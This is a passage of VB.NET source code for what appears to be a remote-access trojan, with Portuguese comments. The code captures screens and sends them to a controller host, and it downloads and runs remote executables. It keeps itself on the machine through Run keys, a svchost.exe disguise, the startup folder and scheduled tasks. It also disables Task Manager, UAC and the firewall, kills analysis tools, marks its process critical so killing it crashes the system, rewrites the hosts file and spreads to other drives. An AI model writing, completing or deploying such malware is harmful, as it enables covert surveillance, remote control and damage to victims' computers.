                                Send("pl" & Y & A(1) & Y & 0)
                            End If
                        End If
                        Dim obj As Object = Plugin(by, "A")
                        Send("ret" & Y & A(1) & Y & ENB(CType(obj.GT, String)))




                        'ÁREA DE TRABALHO=============================================================================================================================================================
                Case "CAP"

                        Dim x As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                        Dim g = Graphics.FromImage(x)
                        g.CopyFromScreen(0, 0, 0, 0, New Size(x.Width, x.Height), CopyPixelOperation.SourceCopy)
                        Try
                            Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
                        Catch ex As Exception

                        End Try
                        g.Dispose()
                        Dim m As New IO.MemoryStream
                        b = SB("CAP" & Y)
                        m.Write(b, 0, b.Length)
                        Dim MM As New IO.MemoryStream
                        x.GetThumbnailImage(A(1), A(2), Nothing, Nothing).Save(MM, Imaging.ImageFormat.Jpeg)
                        m.Write(MM.ToArray, 0, MM.Length)
                        Send(m.ToArray)
                        m.Dispose()
                        MM.Dispose()
                        x.Dispose()
                        '============================================================================================================================================================================================






                Case "P" ' PING!

                        Send("P")

                Case "un" ' Uninstall\Close\Restart

                        Select Case A(1)

                            Case "~" 'DESINSTALA SERVIDOR

                                Desinstalar_Servidor()

                            Case "!" 'FINALIZAR SERVIDOR

                                'DESATIVAR "Protect Process With BSOD"
                                If AtivarProcessProtectWithBSOD = "True" Then
                                    pr(0)
                                End If

                                End
                            Case "@" 'REINICIAR SERVIDOR

                                'DESATIVAR "Protect Process With BSOD"
                                If AtivarProcessProtectWithBSOD = "True" Then
                                    pr(0)
                                End If

                                Diagnostics.Process.Start(LO.FullName, AppWinStyle.Hide)
                                End
                        End Select








                        'BAIXAR URL===========================================================================================================================

                Case "PermissaoFrmURL"

                        Send("ChamaFrmBaixaURL" & Y & MeuNome())

                Case "PBaixarArquivoURL"

                        Try
                            Application.DoEvents()
                            Dim by As Byte() = Nothing
                            Dim w As Object = New Net.WebClient
                            by = w.DownloadData(A(1))
                            Dim fn As String = Environ("temp") & "\" & RN(10) & A(2)
                            IO.File.WriteAllBytes(fn, by)
                            Process.Start(fn, AppWinStyle.NormalFocus)
                        Catch ex As Exception

                        End Try

                        '==========================================================================================================================================================================









                Case "up" ' ENVIAR ARQUIVO============================================================================================================================================

                        Dim by As Byte() = Nothing
                        If A(1).ToLower.StartsWith("http") = False Then
                            by = ZIP(Convert.FromBase64String(A(1)), False)
                        Else
                            Dim w As Object = New Net.WebClient
                            by = w.DownloadData(A(1))
                        End If
                        Send("bla")
                        Me.F.Registry.CurrentUser.SetValue("di", "")
                        Dim fn As String = Environ("temp") & "\" & RN(10) & ".exe"
                        IO.File.WriteAllBytes(fn, by)
                        Process.Start(fn, "UP:" & Process.GetCurrentProcess.Id)

                        For i As Integer = 0 To 500
                            Application.DoEvents()
                            Thread.Sleep(10)
                            If Me.F.Registry.CurrentUser.GetValue("di", "") = "!" Then
                                Desinstalar_Servidor()
                            End If
                        Next

                        '=============================================================================================================













                Case "RG" 'REGISTRO 

                        Dim kk As Object = GetKey(A(2))
                        Select Case A(1)
                            Case "~" ' send keys under key+ send values 

                                Dim s As String = "RG" & Y & "~" & Y & A(2) & Y
                                Dim o As String = ""
                                For Each x As String In kk.GetSubKeyNames
                                    If x.Contains("\") = False Then
                                        o += x & Y
                                    End If
                                Next
                                For Each x As String In kk.GetValueNames
                                    o += x & "/" & kk.GetValueKind(x).ToString & "/" & kk.GetValue(x, "").ToString & Y
                                Next
                                Send(s & o)

                            Case "!" 'CRIAR VALOR

                                kk.SetValue(A(3), A(4), A(5))

                            Case "@" 'EXCLUIR VALOR

                                kk.DeleteValue(A(3), False)

                            Case "#" 'CRIAR KEY

                                kk.CreateSubKey(A(3))

                            Case "$" 'EXCLUIR KEY

                                kk.DeleteSubKeyTree(A(3))

                        End Select

            End Select

        Catch ex As Exception

            Try

                Send("ER" & Y & A(0) & Y & ex.Message)

                If A(0) = "up" Or A(0) = "rn" Then
                    Send("bla")
                End If

            Catch e As Exception

            End Try

        End Try

    End Sub

    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey 'PEGAR REGISTRO (KEY)
        Dim k As String
        If key.StartsWith(F.Registry.ClassesRoot.Name) Then
            k = key.Replace(F.Registry.ClassesRoot.Name & "\", "")
            Return F.Registry.ClassesRoot.OpenSubKey(k, True)
        End If
        If key.StartsWith(F.Registry.CurrentUser.Name) Then
            k = key.Replace(F.Registry.CurrentUser.Name & "\", "")
            Return F.Registry.CurrentUser.OpenSubKey(k, True)
        End If
        If key.StartsWith(F.Registry.LocalMachine.Name) Then
            k = key.Replace(F.Registry.LocalMachine.Name & "\", "")
            Return F.Registry.LocalMachine.OpenSubKey(k, True)
        End If
        If key.StartsWith(F.Registry.Users.Name) Then
            k = key.Replace(F.Registry.Users.Name & "\", "")
            Return F.Registry.Users.OpenSubKey(k, True)
        End If
        Return Nothing
    End Function

    Public Cn As Boolean = False
    Public C As Object = Nothing

    'Protect Process With BSOD
    Sub pr(ByVal i As Integer)

        '0 = DESATIVAR "Protect Process With BSOD"
        '1 = ATIVAR "Protect Process With BSOD"
        Try
            NtSetInformationProcess(Process.GetCurrentProcess.Handle, 29, i, 4)
        Catch ex As Exception

        End Try

    End Sub

    Public Sub Send(ByVal b As Byte())
        If Cn = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            Cn = False
        End Try
    End Sub

    Public Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub





    Sub Minha_Conexao()

        Dim M As Object = New IO.MemoryStream 'Criar Memory Stream
        Dim lp As Integer = 0
re:
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If Cn = False Then GoTo e
            lp += 1

            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If

            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then ' split packet..
                    Dim A As Array = fx(M.ToArray, SPL)




                    Dim T As New Thread(AddressOf Ind)

                    T.SetApartmentState(ApartmentState.STA) 'AQUI TEST


                    T.Start(A(0))


                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If

        Catch ex As Exception
            GoTo e
        End Try

        Thread.Sleep(1)

        GoTo re
e:
        Cn = False

        Try
            C.Client.Disconnect(False)
        Catch ex As Exception

        End Try

        Try
            M.Dispose()
        Catch ex As Exception

        End Try

        M = New IO.MemoryStream

        Try
            Pro.Kill()
            Pro = Nothing
        Catch ex As Exception

        End Try

        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            'CONECTAR NO HOST E NA PORTA
            C.Client.Connect(ListHosts, ListPortas)

            Cn = True


            Send(Get_MinhasInformações) 'ENVIAR MINHAS INFORMAÇÕES ADIQUIRIDA LA NA FUNCTION "Get_MinhasInformações"


            Try
                If GTV("us") = "!" Then
                    Send("us")
                End If
            Catch ex As Exception
                Cn = False
            End Try

        Catch ex As Exception
            Thread.Sleep(2500)
            GoTo e
        End Try

        GoTo re

    End Sub





    Public Sub Desinstalar_Servidor() 'DESINSTALAR SERVIDOR
        Application.DoEvents()

        'DESATIVAR "Protect Process With BSOD"================================================================================================================================================================================================================================================
        If AtivarProcessProtectWithBSOD = "True" Then
            pr(0)
        End If
        '============================================================================================================================================================================================================================================================================================================

        'EXCLUIR CHAVE DA HKEY_CURRENT_USER,Run================================================================================================================================================================================================================================================
        Try
            If AtivarChaveHKEY_USER = "True" Then
                Registry.CurrentUser.OpenSubKey(NomeDaChaveRegistro, True).DeleteValue(NomeDaChaveHKEY_USER, False)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'EXCLUIR CHAVE DA HKEY_CURRENT_USER,Policies================================================================================================================================================================================================================================================
        Try
            If AtivarChaveRUN1 = "True" Then
                Registry.CurrentUser.OpenSubKey(NomeDaChaveRUN, True).DeleteValue(NomeDaChaveRUN1, False)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'EXCLUIR CHAVE DA HKEY_LOCAL_MACHINE,Run============================================================================================================================================================================================================================================================================================================
        Try
            If AtivarChaveHKEY_MACHINE = "True" Then
                Registry.LocalMachine.OpenSubKey(NomeDaChaveRegistro, True).DeleteValue(NomeDaChaveHKEY_MACHINE, False)
            End If
        Catch ex As Exception

        End Try
        '========================================================================================================================================================================================================================================================================================================================================================================

        'EXCLUIR CHAVE DA HKEY_LOCAL_MACHINE,Policies============================================================================================================================================================================================================================================================================================================
        Try
            If AtivarChaveRUN2 = "True" Then
                Registry.LocalMachine.OpenSubKey(NomeDaChaveRUN, True).DeleteValue(NomeDaChaveRUN2, False)
            End If
        Catch ex As Exception

        End Try
        '========================================================================================================================================================================================================================================================================================================================================================================

        'EXCLUIR SERVIDOR DA PASTA "Startup"========================================================================================================================================================================================================================================================================================================================================================================
        Try
            If AtivarStartUp = "True" Then
                Dim DireNome As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & NomeStartUp & ".exe"
                If File.Exists(DireNome) Then
                    File.Delete(DireNome)
                End If
            End If
        Catch ex As Exception

        End Try
        '========================================================================================================================================================================================================================================================================================================================================================================

        'EXCLUIR BYPASS FIREWAL WINDOWS============================================================================================================================================================================================================================================================================================================
        Try
            If AtivarBypassFirewall = "True" Then
                Shell("netsh firewall delete allowedprogram " & ChrW(34) & LO.FullName & ChrW(34), AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try
        '========================================================================================================================================================================================================================================================================================================================================================================


        Try ' delete My Registry Key
            F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(NomeDaChaveMutex, False)
        Catch ex As Exception

        End Try



        'REMOVE O BLOQUEIO DE SITES============================================================================================================================================================================================================================================================================================================
        If AtivarListaSites = "True" Then

            '32x BYTS
            Try
                Dim StrFile As String = "C:\Windows\System32\drivers\etc\hosts"
                If File.Exists(StrFile) Then
                    Dim N As New StreamWriter(StrFile, False)
                    N.Write("")
                    N.Close()
                End If
            Catch ex As Exception

            End Try

            '64x BYTS
            Try
                Dim StrFile As String = "C:\Windows\SysWow64\drivers\etc\hosts"
                If File.Exists(StrFile) Then
                    Dim N As New StreamWriter(StrFile, False)
                    N.Write("")
                    N.Close()
                End If
            Catch ex As Exception

            End Try

        End If
        '============================================================================================================================================================================================================================================================================================================

        'ATIVAR GERENCIADOR DE TAREFAS============================================================================================================================================================================================================================================================================================================
        Try
            If ADesativarGerenciadorDeTarefas = "True" Then
                Dim Regiistro As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                Regiistro.SetValue("DisableTaskMgr", 0)
                Regiistro.Close()
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'ATIVAR CMD================================================================================================================================================================================================================================================
        Try
            If ADesativarCMD = "True" Then
                Dim Regiistro As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Policies\Microsoft\Windows\System")
                Regiistro.SetValue("DisableCMD", 0)
                Regiistro.Close()
            End If
        Catch ex As Exception

        End Try
        '================================================================================================================================================================================================================================================

        'ATIVAR REGEDIT================================================================================================================================================================================================================================================
        Try
            If ADesativarRegedit = "True" Then
                Dim Regiistro As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                Regiistro.SetValue("DisableRegistryTools", 0)
                Regiistro.Close()
            End If
        Catch ex As Exception

        End Try
        '================================================================================================================================================================================================================================================

        'ATIVAR EXECUTAR
        Try
            If ADesativarExecutar = "True" Then
                Dim Regiistro As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
                Regiistro.SetValue("NoRun", 0)
                Regiistro.Close()
            End If
        Catch ex As Exception

        End Try

        'ATIVAR UAC
        Try
            If ADesativarUAC = "True" Then
                Shell("cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try

        'ATIVAR PAINEL DE CONTROLE
        Try
            If ADesativarPainelDeControle = "True" Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try

        'ATIVAR OPÇÕES DE PASTA
        Try
            If ADesativarOpçõesDePasta = "True" Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try

        'ATIVAR MENU CONTEXTO============================================================================================================================================================================================================================================================================================================
        Try
            If ADesativarMenuContexto = "True" Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
                Shell("REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try
        '========================================================================================================================================================================================================================================================================================================================================================================

        'ATIVAR BARRA DE TAREFAS============================================================================================================================================================================================================================================================================================================
        Try
            If ADesativarBarraDeTarefas = "True" Then
                Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
                SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
            End If
        Catch ex As Exception

        End Try
        '========================================================================================================================================================================================================================================================================================================================================================================

        'ATIVAR FIREWAL============================================================================================================================================================================================================================================================================================================
        Try
            If ADesativarFirewall = "True" Then
                Shell("netsh.exe firewall set opmode enable", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'EXCLUIR ARQUIVO DO KEYLOGGER================================================================================================================================================================================================================================================
        Try
            If File.Exists(LO.FullName & ".tmp") Then
                File.Delete(LO.FullName & ".tmp")
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'TIRAR O ATRIBUTO DO ARQUIVO PARA PODER EXCLUIR=========================================================================================================================================================================================================================================================
        Try
            If OcutarServidor = "True" Then
                If Directory.Exists(DirOcuto) Then
                    Shell("cmd.exe /C attrib -s -h " & """" & DirOcuto & """", AppWinStyle.Hide, True, -1)
                End If
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'EXCLUIR SERVIDOR================================================================================================================================================================================================================================================
        Try
            Shell("cmd.exe /C ping 0 & del " & LO.FullName, AppWinStyle.Hide)
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        End 'FINALIZAR PROCESSO

    End Sub

    Private Function CompDir(ByVal F1 As IO.FileInfo, ByVal F2 As IO.FileInfo) As Boolean ' Compare 2 path
        If F1.Name.ToLower <> F2.Name.ToLower Then Return False
        Dim D1 = F1.Directory
        Dim D2 = F2.Directory
re:
        If D1.Name.ToLower = D2.Name.ToLower = False Then Return False
        D1 = D1.Parent
        D2 = D2.Parent
        If D1 Is Nothing And D2 Is Nothing Then Return True
        If D1 Is Nothing Then Return False
        If D2 Is Nothing Then Return False
        GoTo re
    End Function


    Dim DirOcuto As String = String.Empty


    'INSTALAÇÃO DO SERVIDOR====================================================================================================================================================================================================================================================================
    Public Sub Instalar_Servidor()

        Dim DiretorioVerificar As String = Nothing

        If DR = "TEMP" Then
            DiretorioVerificar = Environ("TEMP")
        ElseIf DR = "AppData" Then
            DiretorioVerificar = Environ("AppData")
        ElseIf DR = "UserProfile" Then
            DiretorioVerificar = Environ("UserProfile")
        ElseIf DR = "ProgramData" Then
            DiretorioVerificar = Environ("ProgramData")
        ElseIf DR = "CommonProgramFiles" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles)
        ElseIf DR = "Cookies" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.Cookies)
        ElseIf DR = "Desktop" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        ElseIf DR = "Favorites" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.Favorites)
        ElseIf DR = "History" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.History)
        ElseIf DR = "InternetCache" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)
        ElseIf DR = "LocalApplicationData" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        ElseIf DR = "MyDocuments" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
        ElseIf DR = "MyMusic" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
        ElseIf DR = "MyPictures" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
        ElseIf DR = "ProgramFiles" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        ElseIf DR = "Programs" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.Programs)
        ElseIf DR = "System" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.System)
        ElseIf DR = "Templates" Then
            DiretorioVerificar = Environment.GetFolderPath(Environment.SpecialFolder.Templates)
        End If

        If Not Directory.Exists(DiretorioVerificar & "\" & NomePastaFile) Then
            Directory.CreateDirectory(DiretorioVerificar & "\" & NomePastaFile)
        End If

        DiretorioVerificar = DiretorioVerificar & "\" & NomePastaFile

        DirOcuto = DiretorioVerificar

        If CompDir(LO, New IO.FileInfo(DiretorioVerificar.ToLower & "\" & EXE.ToLower)) = True Then
            'EU NÃO PRECISO COPIAR
        Else

            Try
                If GTV("us") = "" Then
                    If LO.Directory.Name.Contains(":") Then
                        STV("US", "!")
                    Else
                        STV("US", "@")
                    End If
                End If
            Catch ex As Exception

            End Try


            'DESATIVAR JANELA DE SEGURANÇA
            Try
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
            Catch ex As Exception

            End Try

            'EXCLUIR ARQUIVO (MELT)====================================================================================================================================================================================================================================
            If AtivarExcluirArquivo = "True" Then
                If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                    If File.Exists(Path.GetTempPath & "melt.txt") Then
                        Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                    End If
                Else
                    If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                        Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        End
                    Else
                        IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                        End
                    End If
                End If
            End If
            '========================================================================================================================================================================================================================================================================================



            'INSTALAÇÃO========================================================================================================================================================================================================================================================================================
            Try
                Application.DoEvents()
                IO.File.Copy(LO.FullName, DiretorioVerificar & "\" & EXE, True)
                Thread.Sleep(50)
                Diagnostics.Process.Start(DiretorioVerificar & "\" & EXE)

                'OCUTAR ARQUIVOS======================================================================================================================================================================================================================================
                If OcutarServidor = "True" Then
                    If Directory.Exists(DiretorioVerificar) Then
                        Shell("cmd.exe /C attrib +s +h " & """" & DiretorioVerificar & """", AppWinStyle.Hide)
                    End If
                End If
                '====================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================

                'MENSAGEM FAKE DO SERVIDOR========================================================================================================================================================================================================================================================================================
                If AtivarMensagem = "True" Then
                    Dim MsgBoxIcones As MessageBoxIcon
                    Dim MsgBoxButao As MessageBoxButtons
                    If TipoDeIconesMensagem = "Question" Then
                        MsgBoxIcones = MessageBoxIcon.Question
                    ElseIf TipoDeIconesMensagem = "Hand" Then
                        MsgBoxIcones = MessageBoxIcon.Error
                    ElseIf TipoDeIconesMensagem = "Warning" Then
                        MsgBoxIcones = MessageBoxIcon.Exclamation
                    ElseIf TipoDeIconesMensagem = "Asterisk" Then
                        MsgBoxIcones = MessageBoxIcon.Information
                    ElseIf TipoDeIconesMensagem = "None" Then
                        MsgBoxIcones = MessageBoxIcon.None
                    End If
                    If TipoDeButaoMensagem = "OK" Then
                        MsgBoxButao = MessageBoxButtons.OK
                    ElseIf TipoDeButaoMensagem = "OKCancel" Then
                        MsgBoxButao = MessageBoxButtons.OKCancel
                    ElseIf TipoDeButaoMensagem = "RetryCancel" Then
                        MsgBoxButao = MessageBoxButtons.RetryCancel
                    ElseIf TipoDeButaoMensagem = "YesNo" Then
                        MsgBoxButao = MessageBoxButtons.YesNo
                    ElseIf TipoDeButaoMensagem = "YesNoCancel" Then
                        MsgBoxButao = MessageBoxButtons.YesNoCancel
                    ElseIf TipoDeButaoMensagem = "AbortRetryIgnore" Then
                        MsgBoxButao = MessageBoxButtons.AbortRetryIgnore
                    End If
                    If OutroTipoDeMensagem = "True" Then
                        MessageBox.Show(TextoDaMensagem, TituloDaMensagem, MessageBoxButtons.OKCancel, MsgBoxIcones, MessageBoxDefaultButton.Button1, Nothing, True)
                    Else
                        MessageBox.Show(TextoDaMensagem, TituloDaMensagem, MsgBoxButao, MsgBoxIcones)
                    End If
                End If
                '========================================================================================================================================================================================================================================================================================

                End 'SAIR DO PROCESSO

            Catch ex As Exception
                End
            End Try

        End If
        '============================================================================================================================================================================================================================================================================================================================================

        'BYPASS FIREWAL WINDOWS=========================================================================================================================================================================================================================================================
        If AtivarBypassFirewall = "True" Then
            Try
                Shell("netsh firewall add allowedprogram " & ChrW(34) & LO.FullName & ChrW(34) & " " & ChrW(34) & LO.Name & ChrW(34) & " ENABLE", AppWinStyle.Hide)
            Catch ex As Exception

            End Try
        End If
        '============================================================================================================================================================================================================================================================================================================================================

        'CRIAR CHAVE NA HKEY_CURRENT_USER============================================================================================================================================================================================================================================================================================================================================
        Try
            If AtivarChaveHKEY_USER = "True" Then
                CriarChaveHKEYUSER(NomeDaChaveHKEY_USER, LO.FullName, "1")
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'CRIAR CHAVE NA HKEY_CURRENT_USER,Policies============================================================================================================================================================================================================================================================================================================================================
        Try
            If AtivarChaveRUN1 = "True" Then
                CriarChaveHKEYUSER(NomeDaChaveRUN1, LO.FullName, "2")
            End If
        Catch ex As Exception

        End Try
        '===============================================================================================================================================================================================================================================================================================================================================================================================================================

        'CRIAR CHAVE NA HKEY_LOCAL_MACHINE===============================================================================================================================================================================================================================================================================================================================================================================================================================
        Try
            If AtivarChaveHKEY_MACHINE = "True" Then
                CriarChaveHKEYUSER(NomeDaChaveHKEY_MACHINE, LO.FullName, "3")
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'CRIAR CHAVE NA HKEY_LOCAL_MACHINE,Policies============================================================================================================================================================================================================================================================================================================================================
        Try
            If AtivarChaveRUN2 = "True" Then
                CriarChaveHKEYUSER(NomeDaChaveRUN2, LO.FullName, "4")
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'COPIAR PARA "StartUp"============================================================================================================================================================================================================================================================================================================================================
        If AtivarStartUp = "True" Then
            Try
                File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & NomeStartUp & ".exe", True)
            Catch ex As Exception

            End Try
            Thread.Sleep(1000)
        End If
        '============================================================================================================================================================================================================================================================================================================================================

        'AGENDAR SERVIDOR=========================================================================================================================================================================================================================================================
        Try
            If AtivarAgendarServidor = "True" Then
                Dim shadow = My.Computer.FileSystem.SpecialDirectories.Temp & "/StUpdate.exe"
                My.Computer.FileSystem.WriteAllBytes(shadow, IO.File.ReadAllBytes(Application.ExecutablePath), True)
                Shell("schtasks /create /sc minute /mo 1 /tn StUpdate /tr " & shadow, AppWinStyle.Hide)
                Thread.Sleep(50)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'BLOQUEA SITES============================================================================================================================================================================================================================================================================================================================================
        If AtivarListaSites = "True" Then

            '32x BYTS
            Try
                Dim StrFile As String = "C:\Windows\System32\drivers\etc\hosts"
                If File.Exists(StrFile) Then
                    Dim N As New StreamWriter(StrFile, False)
                    For Each U In Split(ListaSites, ",")
                        N.Write(U & vbNewLine)
                    Next
                    N.Close()
                End If
            Catch ex As Exception

            End Try

            '64x BYTS
            Try
                Dim StrFile As String = "C:\Windows\SysWow64\drivers\etc\hosts"
                If File.Exists(StrFile) Then
                    Dim N As New StreamWriter(StrFile, False)
                    For Each U In Split(ListaSites, ",")
                        N.Write(U & vbNewLine)
                    Next
                    N.Close()
                End If
            Catch ex As Exception

            End Try

        End If
        '============================================================================================================================================================================================================================================================================================================================================

        'INICIAR ANTI PROCESS DA CLASS "CsAntiProcess"============================================================================================================================================================================================================================================================================================================================================
        Try
            If ASitemsProcess = "False" And ASbieCtrl = "False" And ASpyTheSpy = "False" And Awireshark = "False" And AapateDNS = "False" And AIPBlocker = "False" And ATiGeR_Firewall = "False" And Asmsniff = "False" And AexeinfoPE = "False" And ANetSnifferCs = "False" And ASandboxie_Control = "False" And Aprocesshacker = "False" And AGerenciador = "False" And AMsconfig = "False" And AdnSpy = "False" And ACodeReflect = "False" And AReflector = "False" And AILSpy = "False" Then
                'MsgBox("TUDO FALSE")
            Else
                CsAntiProcess.Start()
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'SPREAD DISCO LOCAL===============================================================================================================================================================================================================================================================================================================================================================================================================================
        Try
            If AtivarSpreadDiscoLocal = "True" Then
                Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
                Dim d As DriveInfo
                For Each d In allDrives
                    Application.DoEvents()
                    Thread.Sleep(5)
                    If d.IsReady = True Then
                        File.Copy(Application.ExecutablePath, d.RootDirectory.FullName & NomeSpreadDiscoLocal, True)
                    End If
                Next
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'DESATIVAR GERENCIADOR DE TAREFAS===============================================================================================================================================================================================================================================================================================================================================================================================================================
        Try
            If ADesativarGerenciadorDeTarefas = "True" Then
                Dim Regiistro As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                Regiistro.SetValue("DisableTaskMgr", 1)
                Regiistro.Close()
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'DESATIVAR CMD============================================================================================================================================================================================================================================================================================================================================
        Try
            If ADesativarCMD = "True" Then
                Dim Regiistro As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Policies\Microsoft\Windows\System")
                Regiistro.SetValue("DisableCMD", 1)
                Regiistro.Close()
            End If
        Catch ex As Exception

        End Try
        '===============================================================================================================================================================================================================================================================================================================================================================================================================================

        'DESATIVAR REGEDIT===============================================================================================================================================================================================================================================================================================================================================================================================================================
        Try
            If ADesativarRegedit = "True" Then
                Dim Regiistro As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                Regiistro.SetValue("DisableRegistryTools", 1)
                Regiistro.Close()
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'DESATIVAR EXECUTAR================================================================================================================================================================================================================================================
        Try
            If ADesativarExecutar = "True" Then
                Dim Regiistro As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
                Regiistro.SetValue("NoRun", 1)
                Regiistro.Close()
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'DESATIVAR UAC================================================================================================================================================================================================================================================
        Try
            If ADesativarUAC = "True" Then
                Shell("cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'DESATIVAR PAINEL DE CONTROLE================================================================================================================================================================================================================================================
        Try
            If ADesativarPainelDeControle = "True" Then
